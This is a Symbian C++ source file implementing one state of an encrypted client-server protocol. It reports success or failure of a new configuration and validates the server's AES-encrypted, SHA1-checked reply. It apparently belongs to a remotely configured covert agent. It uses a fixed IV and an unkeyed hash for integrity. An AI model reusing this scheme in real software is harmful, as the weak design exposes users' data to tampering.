/*
 * StateNewConfFeedback.cpp
 *
 *  Created on: 23/set/2011
 *      Author: Giovanna
 */

#include "StateNewConfFeedback.h"

#include "Keys.h"
#include <HT\FileUtils.h>
#include <HT\ShaUtils.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>

CStateNewConfFeedback::CStateNewConfFeedback(MStateObserver& aObserver) :
	CAbstractState(EState_NewConf_Feedback, aObserver)
	{
	// No implementation required
	}

CStateNewConfFeedback::~CStateNewConfFeedback()
	{
	delete iRequestData;
	delete iResponseData;
	}

CStateNewConfFeedback* CStateNewConfFeedback::NewLC(MStateObserver& aObserver)
	{
	CStateNewConfFeedback* self = new (ELeave) CStateNewConfFeedback(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateNewConfFeedback* CStateNewConfFeedback::NewL(MStateObserver& aObserver)
	{
	CStateNewConfFeedback* self = CStateNewConfFeedback::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateNewConfFeedback::ConstructL()
	{
	}

void CStateNewConfFeedback::ActivateL(const TDesC8& aData)
	{
	// Parameter aData stores the K key
	iSignKey.Copy(aData);
	
	TBuf8<64> plainBody;
	//append command
	plainBody.Copy(KProto_NewConf);
	//append feedback
	if(iError == KErrNone)
		plainBody.Append(KProto_Ok);
	else
		plainBody.Append(KProto_No);
	//calculate SHA1
	TBuf8<20> sha;
	ShaUtils::CreateSha(plainBody,sha);
	//append SHA1
	plainBody.Append(sha);
	//encrypt 
	RBuf8 buff(AES::EncryptPkcs5L(plainBody, KIV, iSignKey));
	buff.CleanupClosePushL();
	
	//add REST header
	HBufC8* header = iObserver.GetRequestHeaderL();
	TBuf8<32> contentLengthLine;
	contentLengthLine.Append(KContentLength);
	contentLengthLine.AppendNum(buff.Size());
	contentLengthLine.Append(KNewLine);
	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
	iRequestData->Des().Append(*header);
	delete header;
	iRequestData->Des().Append(contentLengthLine);
	iRequestData->Des().Append(KNewLine);
	iRequestData->Des().Append(buff);
	CleanupStack::PopAndDestroy(&buff);
	//send
	iObserver.SendStateDataL(*iRequestData);
	}

void CStateNewConfFeedback::ProcessDataL(const TDesC8& aData)
	{
	//free resources
	delete iRequestData;
	iRequestData = NULL;
			
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check this
			iResponseData->Des().Append(aData);
			}
		return;
		}
		
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		if(iResponseData->Find(KBinaryOS)==KErrNotFound)
			{
			//server answered with a redirect
			iObserver.ResponseError(KErrContent);
			return;
			}
		}
		
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
	//decrypt	
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrSha);
		return;
		}
	
	// in this state the response will always be KProto_No
	// we ignore it
	/*
	if(plainBody.Left(4).Compare(KProto_Ok) == 0)
		{
		//there's a new config
		RFs fs;
		User::LeaveIfError(fs.Connect());
		CleanupClosePushL(fs);

		TFullName filename;
		filename.Copy(KTMP_CONFNAME);
		FileUtils::CompleteWithPrivatePathL(fs, filename);
		RFile aFile;
		aFile.Replace(fs, filename, EFileWrite | EFileStream);
		aFile.Write(plainBody.Mid(8,plainBody.Size()-28));  //8 = OK|len, also strip final sha (20 bytes)
		aFile.Close();
			
		CleanupStack::PopAndDestroy(&fs);
				
		iObserver.NewConfigAvailable();
		}
		*/
	CleanupStack::PopAndDestroy(&plainBody);
	iObserver.ChangeStateL(KErrNone);
	
	}

void CStateNewConfFeedback::SetError(TInt aError)
	{
	iError = aError;
	}
